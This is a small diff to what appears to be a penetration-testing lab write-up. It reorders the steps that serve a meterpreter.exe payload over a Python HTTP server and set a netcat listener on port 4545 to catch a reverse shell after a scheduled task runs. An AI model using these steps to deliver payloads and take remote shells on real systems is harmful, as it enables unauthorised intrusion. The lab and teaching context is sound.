@@ -455,6 +455,11 @@ Final size of exe file: 7168 bytes
 Saved as: meterpreter.exe
 ```
 
+We run the Python HTTPServer also.
+```
+hippoeug@kali:~$ sudo python -m SimpleHTTPServer 80
+```
+
 Let's Schedule New Task.
 
 ![meterpreter_old](https://user-images.githubusercontent.com/21957042/114263514-81a68a80-9a18-11eb-9a5f-bb2e4c8e5738.png)
@@ -471,11 +476,7 @@ This task was scheduled successfully.
 
 ![ScheduledTask](https://user-images.githubusercontent.com/21957042/114263510-7fdcc700-9a18-11eb-832c-e743bd532210.png)
 
-Let's run the Python HTTPServer also.
-```
-hippoeug@kali:~$ sudo python -m SimpleHTTPServer 80
-```
-And a nc listener.
+And start a nc listener.
 ```
 hippoeug@kali:~$ nc -lvnp 4545
 listening on [any] 4545 ...
